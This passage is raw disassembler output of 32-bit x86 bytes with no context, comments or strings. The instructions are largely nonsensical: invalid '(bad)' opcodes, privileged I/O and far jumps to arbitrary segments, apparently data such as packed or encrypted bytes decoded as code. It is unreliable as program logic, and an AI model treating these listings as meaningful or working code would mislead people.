  4099cb:	das    
  4099cc:	sbb    eax,0xeeb4459f
  4099d1:	rol    DWORD PTR [edi+0x5],cl
  4099d4:	sbb    cl,BYTE PTR [ecx]
  4099d6:	(bad)  
  4099d7:	jb     0x4099a1
  4099d9:	dec    ecx
  4099da:	inc    esi
  4099db:	mov    bh,0xcd
  4099dd:	lods   eax,DWORD PTR ds:[esi]
  4099de:	call   0xe71fc272
  4099e3:	aas    
  4099e4:	pop    es
  4099e5:	sbb    eax,0xb7ca3390
  4099ea:	or     esp,DWORD PTR [esi+0x3a647d07]
  4099f0:	enter  0x2f6,0xb2
  4099f4:	inc    ebp
  4099f5:	add    eax,0xc29cd927
  4099fa:	mov    ds:0xadcb7f7b,eax
  4099ff:	cmp    eax,0x6b5715c8
  409a04:	push   ebp
  409a05:	ja     0x409a43
  409a07:	gs sahf 
  409a09:	out    0xb8,eax
  409a0b:	imul   eax,DWORD PTR [edi],0x3f
  409a0e:	stos   BYTE PTR es:[edi],al
  409a0f:	scas   al,BYTE PTR es:[edi]
  409a10:	push   ds
  409a11:	shr    DWORD PTR [ebp+eax*8-0x3899f40e],0xa4
  409a19:	and    DWORD PTR [edx],0x2466fdfb
  409a1f:	hlt    
  409a20:	scas   al,BYTE PTR es:[edi]
  409a21:	mov    ebp,0xe9cbfb00
  409a26:	outs   dx,BYTE PTR ds:[esi]
  409a27:	push   es
  409a28:	push   ss
  409a29:	icebp  
  409a2a:	ja     0x409a3c
  409a2c:	popa   
  409a2d:	fbld   TBYTE PTR [eax-0x32a84309]
  409a33:	xor    DWORD PTR [edi+0x5f],esi
  409a36:	lods   al,BYTE PTR ds:[esi]
  409a37:	fiadd  DWORD PTR [ebx-0x7d]
  409a3a:	mov    bl,cl
  409a3c:	aas    
  409a3d:	and    ah,dl
  409a3f:	pushf  
  409a40:	into   
  409a41:	xchg   ebp,eax
  409a42:	xchg   edx,eax
  409a43:	adc    DWORD PTR [edi+ebx*2+0x5d],0x2
  409a48:	sbb    BYTE PTR [edi+0x3f],ch
  409a4b:	mov    bh,0x76
  409a4d:	cs mov bh,cl
  409a50:	out    dx,al
  409a51:	dec    ebx
  409a52:	gs sti 
  409a54:	push   ecx
  409a55:	test   eax,0xeb3a1f98
  409a5a:	add    bl,cl
  409a5c:	dec    ecx
  409a5d:	(bad)  
  409a5e:	cli    
  409a5f:	ja     0x409a1a
  409a61:	leave  
  409a62:	repz adc BYTE PTR [eax-0x6d72a829],0xbd
  409a6a:	adc    al,0xc9
  409a6c:	adc    eax,0x1122fa3a
  409a71:	pop    ds
  409a72:	dec    edi
  409a73:	jecxz  0x409a88
  409a75:	mov    bl,0x7e
  409a77:	out    0xa2,eax
  409a79:	enter  0x5866,0x77
  409a7d:	jnp    0x409a15
  409a7f:	ficomp DWORD PTR [edi+0x45250be1]
  409a85:	fsubr  st,st(3)
  409a87:	(bad)  
  409a88:	sar    BYTE PTR [ecx+0x72],0xe5
  409a8c:	lahf   
  409a8d:	jg     0x409a5e
  409a8f:	mov    edx,0x9db164da
  409a94:	pop    ebx
  409a95:	cmp    BYTE PTR es:[ebx],0x56
  409a99:	test   DWORD PTR [edi-0x52],0xfca54777
  409aa0:	pop    ds
  409aa1:	out    0xa3,al
  409aa3:	test   DWORD PTR [edi+0x53],eax
  409aa6:	repz jle 0x409abd
  409aa9:	xchg   ecx,eax
  409aaa:	cld    
  409aab:	gs push ebx
  409aad:	add    BYTE PTR [eax],cl
  409aaf:	call   0x9edd:0x8f459bea
  409ab6:	enter  0x89c7,0x8b
  409aba:	jno    0x409aac
  409abc:	xor    esp,DWORD PTR [ebx+eiz*4-0x39]
  409ac0:	mov    ds:0x8b4637c6,eax
  409ac5:	imul   esi,DWORD PTR [eax+0x70173e1a],0xe53badb8
  409acf:	pushf  
  409ad0:	mov    dh,0x83
  409ad2:	sbb    ah,dh
  409ad4:	push   ebx
  409ad5:	pop    ebp
  409ad6:	popa   
  409ad7:	pop    eax
  409ad8:	aas    
  409ad9:	leave  
  409ada:	and    DWORD PTR [ebp-0x45a8c5ca],edi
  409ae0:	test   BYTE PTR cs:[esi+0x1d],0x56
  409ae5:	inc    eax
  409ae6:	scas   al,BYTE PTR es:[edi]
  409ae7:	outs   dx,DWORD PTR ds:[esi]
  409ae8:	int    0xe6
  409aea:	test   eax,0xec83371b
  409aef:	dec    ecx
  409af0:	xchg   ebx,eax
  409af1:	aad    0x59
  409af3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409af4:	dec    ebx
  409af5:	test   DWORD PTR [ebx],edx
  409af7:	fwait
  409af8:	imul   ecx,DWORD PTR [edi+edx*1-0xfa8ef2d],0xffffff9f
  409b00:	jp     0x409ae3
  409b02:	dec    edx
  409b03:	popa   
  409b04:	cdq    
  409b05:	pop    ecx
  409b06:	mov    dh,0x3a
  409b08:	push   es
  409b09:	leave  
  409b0a:	jmp    0xd584:0x4a712a99
  409b11:	pusha  
  409b12:	add    ch,bh
  409b14:	cmp    ebp,DWORD PTR [edi-0x1a]
  409b17:	lods   al,BYTE PTR ds:[esi]
  409b18:	xchg   edi,esi
  409b1a:	cmp    DWORD PTR [ecx],0x56
  409b1d:	(bad)
  409b21:	cld    
  409b22:	pop    ecx
  409b23:	mov    cl,cl
  409b25:	adc    al,BYTE PTR [edx+0x62c5c590]
  409b2b:	fisub  WORD PTR [ecx+0x50]
  409b2e:	ret    0xbd12
  409b31:	int    0x6a
  409b33:	mov    ebx,0xe38e5823
  409b38:	mov    ah,0xca
  409b3a:	jae    0x409adc
  409b3c:	jno    0x409b54
  409b3e:	xchg   ecx,eax
  409b3f:	cli    
  409b40:	scas   eax,DWORD PTR es:[edi]
  409b41:	shl    DWORD PTR [ecx+edx*8+0x3],cl
  409b45:	dec    ebx
  409b46:	fwait
  409b47:	hlt    
  409b48:	cli    
  409b49:	fidivr WORD PTR [edi-0x54]
  409b4c:	jge    0x409b9a
  409b4e:	mov    ds:0x40d598cf,al
  409b53:	jns    0x409b9a
  409b55:	adc    ah,BYTE PTR [ebp+0x48ef93c6]
  409b5b:	popf   
  409b5c:	dec    esi
  409b5d:	push   ecx
  409b5e:	pmaxub mm5,QWORD PTR [edi+0x74fe82c]
  409b65:	sbb    BYTE PTR [edx+0x66],0xe2
  409b69:	push   edi
  409b6a:	imul   sp,si,0xd50
  409b6f:	mov    dl,0x34
  409b71:	fldcw  WORD PTR [eax]
  409b73:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409b74:	cmp    cl,BYTE PTR [ebp-0x7c]
  409b77:	cdq    
  409b78:	jp     0x409b4a
  409b7a:	xchg   ebx,eax
  409b7b:	mov    esp,0xfaf28f9f
  409b80:	out    dx,eax
  409b81:	test   DWORD PTR ds:0xa90f50d7,0x1b4b4230
  409b8b:	mov    ds:0x1859672a,al
  409b90:	shl    DWORD PTR [ebp-0x368634bc],cl
  409b96:	mov    esp,0x5bd2cede
  409b9b:	stc    
  409b9c:	add    eax,0xf8c2384f
  409ba1:	fild   QWORD PTR [ecx-0x7a]
  409ba4:	dec    eax
  409ba5:	dec    edi
  409ba6:	mov    ecx,DWORD PTR [eax-0x21eca34f]
  409bac:	(bad)  
  409bae:	loop   0x409bfe
  409bb0:	shr    BYTE PTR [ebx+edx*2],0x9a
  409bb4:	adc    DWORD PTR [ebx+0xb],edx
  409bb7:	ret    0x1f60
  409bba:	aaa    
  409bbb:	shl    DWORD PTR [ecx-0x5222198d],cl
  409bc1:	bound  ebp,QWORD PTR [ecx]
  409bc3:	(bad)  
  409bc4:	pop    ss
  409bc5:	pop    edx
  409bc6:	daa    
  409bc7:	mov    WORD PTR [eax+0x616f9ae9],gs
  409bcd:	pop    ds
  409bce:	dec    eax
  409bcf:	mov    ?,WORD PTR [edx+0x61]
  409bd2:	push   esi
  409bd3:	push   eax
  409bd4:	sahf   
  409bd5:	fld    TBYTE PTR [eax+ebx*8+0x6868b746]
  409bdc:	fst    DWORD PTR [esi+0x59]
  409bdf:	mov    dl,0x93
  409be1:	icebp  
  409be2:	mov    BYTE PTR [ecx+edi*2+0x7e48db3f],bl
  409be9:	out    dx,al
  409bea:	dec    esi
  409beb:	sub    DWORD PTR [eax-0x6c],ebp
  409bee:	les    ecx,FWORD PTR [ebx]
  409bf0:	cmp    ecx,0x3a
  409bf3:	retf   
  409bf4:	aas    
  409bf5:	ja     0x409bc6
  409bf7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409bf8:	add    eax,0x6f3a9dfe
  409bfd:	pop    es
  409bfe:	stos   DWORD PTR es:[edi],eax
  409bff:	xlat   BYTE PTR ds:[ebx]
  409c00:	pushf  
  409c01:	jge    0x409c5e
  409c03:	sbb    al,BYTE PTR [ecx-0x62a732b9]
  409c09:	cld    
  409c0a:	dec    esp
  409c0b:	adc    al,0xc9
  409c0d:	jp     0x409bd5
  409c0f:	int3   
  409c10:	shl    DWORD PTR [ebx],cl
  409c12:	stos   BYTE PTR es:[edi],al
  409c13:	mov    cl,0xa5
  409c15:	xchg   ebp,eax
  409c16:	stos   BYTE PTR es:[edi],al
  409c17:	mov    WORD PTR [esi],ds
  409c19:	jecxz  0x409bdb
  409c1b:	inc    ebp
  409c1c:	jno    0x409c4b
  409c1e:	jecxz  0x409bb9
  409c20:	aad    0xc3
  409c22:	outs   dx,BYTE PTR ds:[esi]
  409c23:	retf   
  409c24:	sub    cl,BYTE PTR [ebx+0x785ee534]
  409c2a:	push   ds
  409c2b:	pop    ebx
  409c2c:	jnp    0x409bbd
  409c2e:	xchg   ecx,eax
  409c2f:	xor    bl,al
  409c31:	dec    esp
  409c32:	mov    WORD PTR [ecx],ss
  409c34:	(bad)  
  409c35:	imul   ebp,DWORD PTR [ebx+0xce459ae],0xd5230dc5
  409c3f:	mov    ss,edx
  409c41:	out    0xa9,al
  409c43:	inc    edx
  409c44:	sbb    eax,0xa9e34528
  409c49:	int3   
  409c4a:	cmps   WORD PTR ds:[esi],WORD PTR es:[edi]
  409c4c:	adc    al,0x3f
  409c4e:	add    BYTE PTR [edx+0x94decad],bh
  409c54:	sub    BYTE PTR [esi-0x4f],0x93
  409c58:	mov    ah,0xd1
  409c5a:	scas   eax,DWORD PTR es:[edi]
  409c5b:	les    ecx,FWORD PTR ds:0x8ffde222
  409c61:	rcl    DWORD PTR [ebx-0x28],cl
  409c64:	mov    dh,0x84
  409c66:	in     al,dx
  409c67:	mov    cs,WORD PTR [esi]
  409c69:	leave  
  409c6a:	push   ecx
  409c6b:	int    0x48
  409c6d:	xor    eax,DWORD PTR [ebx+ecx*4]
  409c70:	(bad)  
  409c71:	retf   0x9641
  409c74:	pop    ss
  409c75:	arpl   WORD PTR [edi+0x6d],sp
  409c78:	shl    BYTE PTR [eax+0x3c72102e],0xf1
  409c7f:	push   es
  409c80:	retf   0x1906
  409c83:	ja     0x409cb0
  409c85:	pushf  
  409c86:	ret    
  409c87:	mov    eax,0xdd1faefb
  409c8c:	jno    0x409ce1
  409c8e:	scas   al,BYTE PTR es:[edi]
  409c8f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409c90:	mov    ds:0xa1a6736,al
  409c95:	fbld   TBYTE PTR [edi-0xa674ec2]
  409c9b:	shl    BYTE PTR [ebx-0x29],1
  409c9e:	cmp    DWORD PTR [ebp-0x36],0x7bf965ca
  409ca5:	loop   0x409ca4
  409ca7:	loope  0x409d14
  409ca9:	mov    WORD PTR [edx-0x2c],gs
  409cac:	ja     0x409c65
  409cae:	push   ds
  409caf:	iret   
  409cb0:	inc    ecx
  409cb1:	mov    ds:0xa3d17f37,al
  409cb6:	(bad)  
  409cb8:	test   eax,0x65f8f2f1
  409cbd:	push   eax
  409cbe:	mov    ebx,DWORD PTR [ebp-0x2ec3bc3]
  409cc4:	por    mm6,QWORD PTR [esi+edi*1-0x28b813e]
  409ccc:	fiadd  DWORD PTR [ebx+0xa]
  409ccf:	fst    DWORD PTR [edx+0x33730f21]
  409cd5:	test   eax,0x1356f015
  409cda:	inc    edi
  409cdb:	mov    ds:0x6a933770,al
  409ce0:	stos   BYTE PTR es:[edi],al
  409ce1:	push   ecx
  409ce2:	mov    eax,0xe669b922
  409ce7:	sbb    bl,BYTE PTR [edi+0x5a842ab6]
  409ced:	dec    eax
  409cee:	xchg   esi,eax
  409cef:	inc    ebx
  409cf0:	clc    
  409cf1:	sub    DWORD PTR [ebx+0x117061ed],0x1c
  409cf8:	xchg   edx,eax
  409cf9:	pop    ss
  409cfa:	ret    
  409cfb:	arpl   WORD PTR [ebx-0x42],bx
  409cfe:	(bad)  
  409cff:	or     edx,DWORD PTR [bp+di-0x1c00]
  409d04:	jmp    0x409d08
  409d06:	cmp    al,BYTE PTR [eax-0x4bb42076]
  409d0c:	jmp    0x409d83
  409d0e:	stos   DWORD PTR es:[edi],eax
  409d0f:	ja     0x409caf
  409d11:	ins    DWORD PTR es:[di],dx
  409d13:	fist   DWORD PTR [edx-0x45dcb59d]
  409d19:	mov    bh,0x2a
  409d1b:	xchg   ebp,eax
  409d1c:	pop    es
  409d1d:	jae    0x409ca9
  409d1f:	repnz imul ebx,ebp,0x1
  409d23:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d24:	addr16 inc ebx
  409d26:	mov    fs,WORD PTR [edi]
  409d28:	mov    dl,0x97
  409d2a:	addr16 fdivrp st(2),st
  409d2d:	and    al,al
  409d2f:	lods   eax,DWORD PTR ds:[esi]
  409d30:	stc    
  409d31:	sub    DWORD PTR [ecx-0x5],eax
  409d34:	and    al,0x33
  409d36:	mov    al,BYTE PTR [edi-0x7f]
  409d39:	pop    esi
  409d3a:	add    eax,0x79713dcb
  409d3f:	or     ecx,eax
  409d41:	shl    ebx,0x1
  409d44:	dec    edx
  409d45:	sub    esp,DWORD PTR [ecx-0x6b04a72]
  409d4b:	leave  
  409d4c:	push   es
  409d4d:	pop    eax
  409d4e:	pop    esi
  409d4f:	jbe    0x409cd3
  409d51:	gs or  eax,0xd6b20742
  409d57:	data16 sti 
  409d59:	test   eax,0x1571b6e9
  409d5e:	lea    ebp,[ebx+0x38dbd1a2]
  409d64:	data16 xor al,0x78
  409d67:	sti    
  409d68:	(bad)  
  409d69:	xlat   BYTE PTR ds:[ebx]
  409d6a:	jp     0x409d3d
  409d6c:	jp     0x409d3e
  409d6e:	es jecxz 0x409d25
  409d71:	nop
  409d72:	mov    bh,0xfd
  409d74:	jno    0x409db1
  409d76:	jge    0x409d03
  409d78:	enter  0x7736,0xdb
  409d7c:	cmp    ebx,DWORD PTR [edi-0x1c]
  409d7f:	arpl   si,dx
  409d81:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409d82:	out    dx,al
  409d83:	sub    edx,DWORD PTR fs:[ebp-0x7e]
  409d87:	xor    BYTE PTR [edi+0x21b9782b],0x15
  409d8e:	hlt    
  409d8f:	push   DWORD PTR [ebx-0x3085e079]
  409d95:	sbb    BYTE PTR [ecx-0x35],al
  409d98:	push   es
  409d99:	or     cl,BYTE PTR [edx+0x3d44d2f1]
  409d9f:	fcomi  st,st(2)
  409da1:	xchg   ecx,eax
  409da2:	scas   al,BYTE PTR es:[edi]
  409da3:	dec    edi
  409da4:	pop    DWORD PTR [edi]
  409da6:	ret    
  409da7:	popa   
  409da8:	adc    bl,BYTE PTR [eax+eax*1+0x39]
  409dac:	(bad)  
  409dae:	xchg   DWORD PTR [edx+0x783b4b0e],esp
  409db4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409db5:	mov    ds:0xd79846e7,eax
  409dba:	fcmovnu st,st(5)
  409dbc:	test   eax,0xae9fef40
  409dc1:	shl    DWORD PTR [edx],1
  409dc3:	not    dh
  409dc5:	sub    al,0xcd
  409dc7:	pop    edi
  409dc8:	pop    DWORD PTR [ebx+0x24]
  409dcb:	retf   0x1f76
  409dce:	add    eax,0x2d08f9d2
  409dd3:	push   cs
  409dd4:	movs   DWORD PTR es:[edi],DWORD PTR ss:[esi]
  409dd6:	xchg   edx,eax
  409dd7:	scas   eax,DWORD PTR es:[edi]
  409dd8:	call   0x3920:0x69a6759c
  409ddf:	mov    dh,0xb4
  409de1:	or     edi,edi
  409de3:	jmp    0x75bf:0x1292adaa
  409dea:	and    BYTE PTR [ebp+0x24],bl
  409ded:	in     al,dx
  409dee:	dec    ecx
  409def:	call   0xf9abbade
  409df4:	cli    
  409df5:	adc    ah,BYTE PTR [esi]
  409df7:	(bad)  
  409df8:	loop   0x409d8b
  409dfa:	sbb    cl,BYTE PTR [edi+0x1b]
  409dfd:	aas    
  409dfe:	dec    esi
  409dff:	sti    
  409e00:	dec    ecx
  409e01:	(bad)  
  409e02:	add    al,0x25
  409e05:	xchg   ecx,eax
  409e06:	ds popf 
  409e08:	and    ebp,edx
  409e0a:	xchg   ebp,eax
  409e0b:	mov    ch,0x47
  409e0d:	call   0x7b80:0xef87f3be
  409e14:	es sbb al,0x2a
  409e17:	cmp    DWORD PTR [eax],eax
  409e19:	push   esp
  409e1a:	jl     0x409e98
  409e1c:	jmp    0x12c29f49
  409e21:	sub    esi,DWORD PTR [edx+0x49]
  409e24:	xor    eax,0xf2884677
  409e29:	push   edi
  409e2a:	pop    edi
  409e2b:	dec    esi
  409e2c:	fadd   QWORD PTR [edi]
  409e2e:	into   
  409e2f:	pop    ds
  409e30:	mov    edx,0x7da21be9
  409e35:	aas    
  409e36:	test   BYTE PTR [ebx+0x32],dh
  409e39:	xor    eax,0xb4eef6e1
  409e3e:	call   0x649b8f07
  409e43:	inc    ebp
  409e44:	sub    DWORD PTR [edi+0x362ebb9],edx
  409e4a:	and    DWORD PTR [ecx+esi*1+0x3a2a40b3],edi
  409e51:	lock add eax,DWORD PTR es:[ebp+0x3b]
  409e56:	mov    WORD PTR [esi-0x3a1afbf5],fs
  409e5c:	popf   
  409e5d:	xor    cl,bh
  409e5f:	test   al,0xed
  409e61:	jg     0x409eb6
  409e63:	cli    
  409e64:	jnp    0x409eb6
  409e66:	jbe    0x409dfc
  409e68:	adc    ch,BYTE PTR [ebp+0x14]
  409e6b:	inc    DWORD PTR [ecx]
  409e6d:	scas   al,BYTE PTR es:[edi]
  409e6e:	inc    edx
  409e6f:	adc    eax,0xd0a93564
  409e74:	fsubr  DWORD PTR [edx]
  409e77:	sbb    al,0xa
  409e79:	jge    0x409e57
  409e7b:	push   ebp
  409e7c:	seta   BYTE PTR [ebp-0x4f]
  409e80:	jns    0x409e4d
  409e82:	daa    
  409e83:	pop    ebx
  409e84:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409e85:	cwde   
  409e86:	ror    BYTE PTR [ecx-0x27],cl
  409e89:	aad    0x82
  409e8b:	repnz xor DWORD PTR [ebx+0xc3f9dc1],edx
  409e92:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409e93:	sar    BYTE PTR [edi-0x54d60105],1
  409e99:	push   es
  409e9a:	inc    ebp
  409e9b:	in     eax,0x21
  409e9d:	dec    ebp
  409e9e:	add    DWORD PTR [edi],esi
  409ea0:	fcmove st,st(5)
  409ea2:	sub    eax,0xc04b13e5
  409ea7:	(bad)  
  409ea8:	into   
  409ea9:	push   ebx
  409eaa:	add    cl,al
  409eac:	ins    DWORD PTR es:[edi],dx
  409ead:	xor    dl,ah
  409eaf:	std    
  409eb0:	test   eax,0xbe01d64c
  409eb5:	neg    DWORD PTR [ebx+eiz*1]
  409eb8:	inc    edx
  409eb9:	jne    0x409e49
  409ebb:	jno    0x409f0e
  409ebd:	push   es
  409ebe:	shl    dh,0x7a
  409ec1:	and    DWORD PTR [edx-0x7a],ebp
  409ec4:	adc    BYTE PTR [ebx+0x4d022316],0x63
  409ecb:	add    esp,DWORD PTR [edi+ecx*4+0x3]
  409ecf:	mov    ah,0x98
  409ed1:	sahf   
  409ed2:	sub    eax,0x52b92325
  409ed7:	ss inc ebx
  409ed9:	mov    ds:0x230d03d3,eax
  409ede:	mov    BYTE PTR [esi+0x1d],dl
  409ee1:	mov    cs,WORD PTR [ebx+0x9]
  409ee4:	and    esi,eax
  409ee6:	push   ebx
  409ee7:	loopne 0x409f0e
  409ee9:	and    al,0xf1
  409eeb:	sahf   
  409eec:	addr16 push edx
  409eee:	mov    ds:0x619a3b09,al
  409ef3:	(bad)  
  409ef4:	fst    DWORD PTR [edx-0x40]
  409ef7:	cwde   
  409ef8:	bound  esp,QWORD PTR [ebp+0x66]
  409efb:	out    dx,al
  409efc:	loope  0x409e94
  409efe:	stos   BYTE PTR es:[edi],al
  409eff:	rol    BYTE PTR [ebp+0x19a3a326],0xb
  409f06:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f07:	inc    edx
  409f08:	sahf   
  409f09:	ror    DWORD PTR [ebx],0x86
  409f0c:	add    al,BYTE PTR [ecx]
  409f0e:	retf   
  409f0f:	shl    DWORD PTR [edx-0x23e21423],0x32
  409f16:	in     al,dx
  409f17:	fdivr  QWORD PTR [edi]
  409f19:	lds    esp,FWORD PTR [edi+ecx*1+0x2b]
  409f1d:	inc    ebp
  409f1e:	xchg   BYTE PTR [eax+0x8bfa60d],al
  409f24:	mov    al,ds:0x7b562690
  409f29:	cs daa 
  409f2b:	out    0x12,al
  409f2d:	mov    dl,0x96
  409f2f:	fstp   st(2)
  409f31:	leave  
  409f32:	xor    al,0xe5
  409f34:	add    esp,DWORD PTR [edi]
  409f36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  409f37:	mov    fs,WORD PTR [edi-0x4b]
  409f3a:	sub    al,0xe1
  409f3c:	inc    esi
  409f3d:	jae    0x409ed2
  409f3f:	mov    al,0x1a
  409f41:	neg    DWORD PTR [eax+0x62ff6418]
  409f47:	inc    ecx
  409f48:	pop    ebx
  409f49:	in     eax,dx
  409f4a:	dec    ebx
  409f4b:	ret    0x9f5f
  409f4e:	cmp    ecx,DWORD PTR [esi-0x6edd2770]
  409f54:	into   
  409f55:	pop    es
  409f56:	push   0xa6f07a84
  409f5b:	inc    ebx
  409f5c:	aaa    
  409f5d:	xor    eax,0x83ea6e25
  409f62:	xlat   BYTE PTR ds:[ebx]
  409f63:	cwde   
  409f64:	jae    0x409f9a
  409f66:	cmp    al,0x34
  409f68:	pop    edx
  409f69:	xchg   ebx,eax
  409f6a:	xchg   ebx,eax
  409f6b:	and    BYTE PTR [edx-0x6d919b5d],ah
  409f71:	sbb    DWORD PTR [edx],ebx
  409f73:	imul   edx,DWORD PTR [edi],0xee16a61b
  409f79:	sbb    BYTE PTR [ebx-0x181c6113],ch
  409f7f:	mov    dl,0x96
  409f81:	sub    DWORD PTR [ebx],edx
  409f83:	je     0x409f68
  409f85:	mov    bh,0xf5
  409f87:	or     BYTE PTR [esi],bh
  409f89:	push   ss
  409f8a:	clc    
  409f8b:	int3   
  409f8c:	outs   dx,DWORD PTR ds:[esi]
  409f8d:	pop    es
  409f8e:	rol    edi,1
  409f90:	stos   BYTE PTR es:[edi],al
  409f91:	pusha  
  409f92:	inc    edi
  409f93:	xchg   esi,eax
  409f94:	jecxz  0x409f8d
  409f96:	sti    
  409f97:	into   
  409f98:	ins    DWORD PTR es:[edi],dx
  409f99:	push   0xf158e6da
  409f9e:	cli    
  409f9f:	scas   eax,DWORD PTR es:[edi]
  409fa0:	mov    ch,0xf5
  409fa2:	inc    esi
  409fa3:	lahf   
  409fa4:	ja     0x409ff6
  409fa6:	daa    
  409fa7:	std    
  409fa8:	xchg   esi,eax
  409fa9:	push   ds
  409faa:	ins    DWORD PTR es:[edi],dx
  409fab:	in     eax,dx
  409fac:	ret    0xd639
  409faf:	push   ecx
  409fb0:	test   cl,ah
  409fb2:	js     0x409fa2
  409fb4:	das    
  409fb5:	mov    dh,0x20
  409fb7:	dec    edi
  409fb8:	cli    
  409fb9:	lea    esi,[ebx+eax*4+0x4a]
  409fbd:	addr16 jl 0x40a036
  409fc0:	xchg   ecx,eax
  409fc1:	bound  ecx,QWORD PTR [ebx+0x1253b5dc]
  409fc7:	sbb    edi,DWORD PTR [ebp-0x6b]
  409fca:	xor    esi,eax
  409fcc:	sub    BYTE PTR [eax+0x47],al
  409fcf:	push   ecx
  409fd0:	je     0x40a02b
  409fd2:	lods   eax,DWORD PTR ds:[esi]
  409fd3:	pop    es
  409fd4:	mov    eax,ds:0xadd34162
  409fd9:	add    al,0x77
  409fdb:	call   0x6b9b:0xac077fcb
  409fe2:	bound  ebx,QWORD PTR [esi+eiz*4]
  409fe5:	shl    DWORD PTR [edx],cl
  409fe7:	icebp  
  409fe8:	xchg   edx,eax
  409fe9:	mov    ebp,0xea6bd606
  409fee:	or     eax,0x172da817
  409ff3:	std    
  409ff4:	retf   
  409ff5:	inc    edx
  409ff6:	scas   eax,DWORD PTR es:[edi]
  409ff7:	call   0x5ea8:0xb90d457e
  409ffe:	retf   0xa9c6
  40a001:	mov    ds:0x2fcbe939,eax
  40a006:	jmp    0xa7cac22f
  40a00b:	sub    dl,BYTE PTR [edi+0x22]
  40a00e:	and    ebp,DWORD PTR [ebx]
  40a010:	or     bh,BYTE PTR [ebx-0x24]
  40a013:	ss add eax,0x5b1cb037
  40a019:	mov    DWORD PTR [ecx+0x4a37209b],ebp
  40a01f:	icebp  
  40a020:	mov    esi,DWORD PTR [esi+0x6144fe82]
  40a026:	ins    BYTE PTR es:[edi],dx
  40a027:	mov    ecx,DWORD PTR [di-0x856]
  40a02c:	call   0x11ade8fc
  40a031:	mov    ah,BYTE PTR [ecx]
  40a033:	ret    
  40a034:	jecxz  0x40a07e
  40a036:	push   es
  40a037:	ins    BYTE PTR es:[edi],dx
  40a038:	dec    BYTE PTR [esi]
  40a03a:	aaa    
  40a03b:	jecxz  0x40a06c
  40a03d:	sbb    esp,edx
  40a03f:	retf   0xefad
  40a042:	and    ecx,esi
  40a044:	dec    ebx
  40a045:	lods   eax,DWORD PTR ds:[esi]
  40a046:	push   ds
  40a047:	cmp    ah,bh
  40a049:	ins    DWORD PTR es:[edi],dx
  40a04a:	push   es
  40a04b:	mov    cl,0xe2
  40a04d:	popf   
  40a04e:	dec    ebx
  40a04f:	jmp    0x1956:0x83a0adde
  40a056:	popf   
  40a057:	lock adc bl,dh
  40a05a:	test   al,0x14
  40a05c:	inc    esp
  40a05d:	dec    esi
  40a05e:	cdq    
  40a05f:	inc    esi
  40a060:	cwde   
  40a061:	les    esp,FWORD PTR [edx]
  40a063:	push   esi
  40a064:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a065:	sbb    al,0xf0
  40a067:	or     al,0xf8
  40a069:	sub    ah,BYTE PTR [edx+0x224c07d8]
  40a06f:	add    cl,al
  40a071:	pop    esi
  40a072:	cmp    BYTE PTR [ecx],bl
  40a074:	repnz push eax
  40a076:	sub    ebx,DWORD PTR [edi+0x3bfbfda0]
  40a07c:	fwait
  40a07d:	shl    DWORD PTR [esi-0x72],1
  40a080:	pushf  
  40a081:	ret    
  40a082:	test   al,0x45
  40a084:	pop    ebp
  40a085:	jae    0x40a04e
  40a087:	mov    al,ds:0xff337393
  40a08c:	mov    cl,0x7c
  40a08e:	mov    edi,0xa9366b12
  40a093:	test   DWORD PTR [ebx],edi
  40a095:	dec    BYTE PTR [edi-0x72]
  40a098:	adc    ch,BYTE PTR [edi-0x60576a57]
  40a09e:	shr    DWORD PTR [esi],1
  40a0a0:	stc    
  40a0a1:	dec    ebx
  40a0a2:	sbb    BYTE PTR [ecx],bh
  40a0a4:	push   eax
  40a0a5:	sbb    eax,0x6d3950ce
  40a0aa:	jbe    0x40a084
  40a0ac:	stos   BYTE PTR es:[edi],al
  40a0ad:	push   eax
  40a0ae:	inc    esi
  40a0af:	in     al,dx
  40a0b0:	mov    bh,0xa4
  40a0b2:	mul    cl
  40a0b4:	clc    
  40a0b5:	xor    ebx,ebx
  40a0b7:	push   esp
  40a0b8:	mov    ds:0xb25548f5,al
  40a0bd:	lock les ecx,FWORD PTR [ecx+esi*4+0x47e46c7a]
  40a0c5:	cwde   
  40a0c6:	(bad)  
  40a0c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a0c9:	cwde   
  40a0ca:	xor    esp,DWORD PTR [edx-0x1b0a5ff]
  40a0d0:	sti    
  40a0d1:	jne    0x40a09e
  40a0d3:	(bad)  
  40a0d4:	dec    ebp
  40a0d5:	test   al,0x90
  40a0d7:	push   ds
  40a0d8:	add    eax,0xe4ca0fce
  40a0dd:	xchg   edx,eax
  40a0de:	or     bh,BYTE PTR [esi+0x1fa0d2aa]
  40a0e4:	fadd   QWORD PTR [edi]
  40a0e6:	sub    dl,BYTE PTR [ebp+ecx*1+0x35e9e949]
  40a0ed:	add    dh,BYTE PTR [eax-0x53]
  40a0f0:	jno    0x40a167
  40a0f2:	retf   
  40a0f3:	sbb    bh,BYTE PTR [ecx+0x3b]
  40a0f6:	xchg   esp,eax
  40a0f7:	clc    
  40a0f8:	out    dx,al
  40a0f9:	jno    0x40a0c2
  40a0fb:	mov    edi,DWORD PTR [edx-0x4d]
  40a0fe:	fistp  QWORD PTR [esi-0x6aa0073d]
  40a104:	aaa    
  40a105:	sub    eax,0x9ab68d43
  40a10a:	aaa    
  40a10b:	jl     0x40a164
  40a10d:	xchg   edx,esi
  40a10f:	xchg   ebp,eax
  40a110:	loop   0x40a094
  40a112:	daa    
  40a113:	int    0x1f
  40a115:	adc    bl,bh
  40a117:	mov    eax,ds:0x10aec7f
  40a11c:	mov    bh,0xb
  40a11e:	xchg   esi,eax
  40a11f:	stos   DWORD PTR es:[edi],eax
  40a120:	adc    ch,BYTE PTR [ecx+0x46]
  40a123:	repz adc dh,dh
  40a126:	mov    edi,ebp
  40a128:	out    0x7b,eax
  40a12a:	lods   al,BYTE PTR ds:[esi]
